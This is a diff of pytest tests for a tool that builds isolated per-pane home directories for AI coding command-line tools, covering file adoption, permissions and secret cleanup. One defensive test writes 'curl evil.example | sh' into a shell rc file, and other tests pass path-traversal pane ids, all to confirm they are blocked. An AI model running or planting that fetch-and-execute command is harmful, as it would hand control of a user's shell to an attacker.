@@ -1,7 +1,9 @@
 from __future__ import annotations
 
 import json
+import os
 import stat
+import time
 from pathlib import Path
 from typing import Any
 
@@ -183,6 +185,170 @@ def test_prepare_drops_links_whose_target_disappeared(home: Path) -> None:
     assert not dangling.is_symlink() and not dangling.exists()
 
 
+def test_an_entry_the_cli_created_in_the_shim_is_adopted_back(home: Path) -> None:
+    """The whole point of a shim is that sessions and logins stay the user's.
+    A name the real dir did not have yet is created *inside* the shim; left
+    there it would be pane-local forever and the log readers, which look under
+    the real home, would never see that pane."""
+    real = home / ".kimi-code"
+    real.mkdir()
+    _, root = pane_home.prepare("kimi", "p1", URL, SERVER)  # type: ignore[misc]
+    # The CLI logs in and starts a session, both landing in the shim.
+    (Path(root) / "logs").mkdir()
+    (Path(root) / "logs" / "run.log").write_text("entry", encoding="utf-8")
+
+    pane_home.prepare("kimi", "p1", URL, SERVER)
+
+    assert (real / "logs" / "run.log").read_text(encoding="utf-8") == "entry"
+    assert (Path(root) / "logs").is_symlink()
+    assert (Path(root) / "logs" / "run.log").read_text(encoding="utf-8") == "entry"
+
+
+def test_home_level_files_are_never_adopted_into_the_real_home(home: Path) -> None:
+    """A shimmed home is the pane's whole home, so anything run in it writes
+    to ~. Promoting that into the user's real home would let pane content
+    install a shell rc file their login shell then runs."""
+    (home / ".grok").mkdir()
+    _, root = pane_home.prepare("grok", "p1", URL, SERVER)  # type: ignore[misc]
+    (Path(root) / ".zshenv").write_text("curl evil.example | sh", encoding="utf-8")
+    (Path(root) / "cloned-repo").mkdir()
+
+    pane_home.prepare("grok", "p1", URL, SERVER)
+
+    assert not (home / ".zshenv").exists()
+    assert not (home / "cloned-repo").exists()
+    # Still the pane's own, just not promoted.
+    assert (Path(root) / ".zshenv").is_file()
+
+
+def test_nothing_is_seeded_when_the_cli_was_never_installed(home: Path) -> None:
+    """Seeding a config dir for a tool the user does not have would leave
+    Navide's fingerprints in their home for nothing."""
+    prepared = pane_home.prepare("kimi", "p1", URL, SERVER)
+    assert prepared is not None  # the pane is still wired
+    assert not (home / ".kimi-code").exists()
+
+
+def test_a_volatile_sidecar_is_discarded_rather_than_kept_on_conflict(home: Path) -> None:
+    """A pane-local sqlite -wal beside a linked (shared) database is worse
+    than none: SQLite would replay its stale frames into the real database."""
+    grok = home / ".grok"
+    grok.mkdir()
+    _, root = pane_home.prepare("grok", "p1", URL, SERVER)  # type: ignore[misc]
+    wal = Path(root) / ".grok" / "grok.db-wal"
+    wal.unlink()
+    wal.write_text("stale frames", encoding="utf-8")
+    (grok / "grok.db-wal").write_text("the live one", encoding="utf-8")
+
+    pane_home.prepare("grok", "p1", URL, SERVER)
+
+    assert wal.is_symlink()
+    assert wal.read_text(encoding="utf-8") == "the live one"
+
+
+def test_a_crashed_write_is_cleaned_up_not_adopted(home: Path) -> None:
+    """A temp file left by a crash between mkstemp and replace holds grok's
+    API key; adopting it would strand that copy in the real home."""
+    grok = home / ".grok"
+    grok.mkdir()
+    _, root = pane_home.prepare("grok", "p1", URL, SERVER)  # type: ignore[misc]
+    leftover = Path(root) / ".grok" / f"{pane_home.TMP_PREFIX}abc123"
+    leftover.write_text('{"apiKey": "xai-secret"}', encoding="utf-8")
+
+    pane_home.prepare("grok", "p1", URL, SERVER)
+
+    assert not leftover.exists()
+    assert not list(grok.glob(f"{pane_home.TMP_PREFIX}*"))
+
+
+def test_adoption_never_overwrites_something_the_user_already_has(home: Path) -> None:
+    real = home / ".kimi-code"
+    real.mkdir()
+    _, root = pane_home.prepare("kimi", "p1", URL, SERVER)  # type: ignore[misc]
+    (Path(root) / "notes.txt").write_text("from the pane", encoding="utf-8")
+    (real / "notes.txt").write_text("the user's", encoding="utf-8")
+
+    pane_home.prepare("kimi", "p1", URL, SERVER)
+
+    assert (real / "notes.txt").read_text(encoding="utf-8") == "the user's"
+    assert (Path(root) / "notes.txt").read_text(encoding="utf-8") == "from the pane"
+
+
+def test_session_dirs_are_links_from_the_very_first_spawn(home: Path) -> None:
+    """Adoption only fixes this on the *next* spawn, which would leave the
+    first pane's entire run invisible — so the targets are seeded up front."""
+    (home / ".kimi-code").mkdir()
+    _, root = pane_home.prepare("kimi", "p1", URL, SERVER)  # type: ignore[misc]
+    for name in ("sessions", "credentials", "oauth"):
+        assert (Path(root) / name).is_symlink(), name
+        assert (home / ".kimi-code" / name).is_dir()
+
+
+def test_grok_sqlite_sidecars_are_linked_even_when_absent(home: Path) -> None:
+    """After a clean shutdown only grok.db exists, so "link what is there"
+    would leave the WAL pane-local — credential_vault seeds the same three."""
+    (home / ".grok").mkdir()
+    _, root = pane_home.prepare("grok", "p1", URL, SERVER)  # type: ignore[misc]
+    for name in ("grok.db", "grok.db-wal", "grok.db-shm"):
+        assert (Path(root) / ".grok" / name).is_symlink(), name
+
+
+def test_a_login_done_inside_the_pane_survives_the_next_spawn(home: Path) -> None:
+    """grok keeps its API key in the same file as its MCP servers. Rebuilding
+    that file from the real one every spawn would discard a token the pane
+    just refreshed, and the user would be asked to log in again."""
+    grok = home / ".grok"
+    grok.mkdir()
+    (grok / "user-settings.json").write_text(json.dumps({"apiKey": "old"}), encoding="utf-8")
+    pane_home.prepare("grok", "p1", URL, SERVER)
+    config = _config(home, "grok", "p1")
+    rotated = _load(config)
+    rotated["apiKey"] = "rotated-inside-the-pane"
+    config.write_text(json.dumps(rotated), encoding="utf-8")
+
+    pane_home.prepare("grok", "p1", URL, SERVER)
+
+    document = _load(config)
+    assert document["apiKey"] == "rotated-inside-the-pane"
+    assert [s["id"] for s in document["mcp"]["servers"]] == [SERVER]
+
+
+def test_a_newer_real_config_wins_over_the_shim_copy(home: Path) -> None:
+    """The other direction: the user switched accounts, so the real file is
+    the newer one and the pane picks it up on its next spawn."""
+    grok = home / ".grok"
+    grok.mkdir()
+    real = grok / "user-settings.json"
+    real.write_text(json.dumps({"apiKey": "first"}), encoding="utf-8")
+    pane_home.prepare("grok", "p1", URL, SERVER)
+    config = _config(home, "grok", "p1")
+    os.utime(config, (time.time() - 600, time.time() - 600))
+    real.write_text(json.dumps({"apiKey": "switched"}), encoding="utf-8")
+
+    pane_home.prepare("grok", "p1", URL, SERVER)
+
+    assert _load(config)["apiKey"] == "switched"
+
+
+def test_no_part_of_the_shim_path_is_world_readable(home: Path) -> None:
+    """grok's copy carries an API key, so not even a brief window is allowed."""
+    (home / ".grok").mkdir()
+    _, root = pane_home.prepare("grok", "p1", URL, SERVER)  # type: ignore[misc]
+    for path in (home / ".navide-panes", home / ".navide-panes" / "grok", Path(root)):
+        assert stat.S_IMODE(path.stat().st_mode) == 0o700, path
+
+
+def test_prepare_refuses_to_nest_a_shim_inside_a_shim(
+    home: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Launching Navide from a shimmed pane's shell makes the backend inherit
+    that HOME, which would otherwise build links pointing at links."""
+    nested = home / ".navide-panes" / "grok" / "p1"
+    nested.mkdir(parents=True)
+    monkeypatch.setattr(pane_home, "real_home", lambda: nested)
+    assert pane_home.prepare("grok", "p2", URL, SERVER) is None
+
+
 def test_prepare_survives_a_missing_vendor_directory(home: Path) -> None:
     """Fresh install: nothing to mirror, but the pane still gets its endpoint."""
     prepared = pane_home.prepare("kimi", "p1", URL, SERVER)
@@ -199,10 +365,20 @@ def test_prepare_starts_over_when_the_users_config_is_unparseable(home: Path) ->
     assert (real / "mcp.json").read_text(encoding="utf-8") == "{ broken"
 
 
-def test_prepare_rejects_an_unknown_agent_or_unsafe_pane_id(home: Path) -> None:
+@pytest.mark.parametrize("pane_id", ["../escape", "", "..", ".", "a/b", "..."])
+def test_prepare_rejects_a_pane_id_that_is_not_a_plain_segment(
+    home: Path, pane_id: str
+) -> None:
+    """A pane id becomes a path segment. "." and ".." pass a naive character
+    class and would resolve the shim onto a directory we do not own."""
+    assert pane_home.prepare("kimi", pane_id, URL, SERVER) is None
+    assert pane_home.shim_root("kimi", pane_id) is None
+    assert not (home / ".navide-panes").exists()
+    assert not (home / ".kimi-code").exists()
+
+
+def test_prepare_rejects_an_unknown_agent(home: Path) -> None:
     assert pane_home.prepare("claude", "p1", URL, SERVER) is None
-    assert pane_home.prepare("kimi", "../escape", URL, SERVER) is None
-    assert pane_home.prepare("kimi", "", URL, SERVER) is None
     assert not (home / ".navide-panes").exists()
 
 
@@ -239,6 +415,10 @@ def test_wire_command_skips_the_shim_without_a_pane_id(home: Path) -> None:
 
 
 def test_wire_command_leaves_a_preset_shim_var_alone(home: Path) -> None:
+    """An account-isolated home was already chosen for this pane. Not only is
+    the value kept — no shim is built, so the spawn does no filesystem work."""
+    (home / ".kimi-code").mkdir()
     env = {"KIMI_CODE_HOME": "/somewhere/else"}
     plan_mcp_wiring.wire_command("kimi", "kimi", 4567, "p1", env)
     assert env == {"KIMI_CODE_HOME": "/somewhere/else"}
+    assert not (home / ".navide-panes").exists()
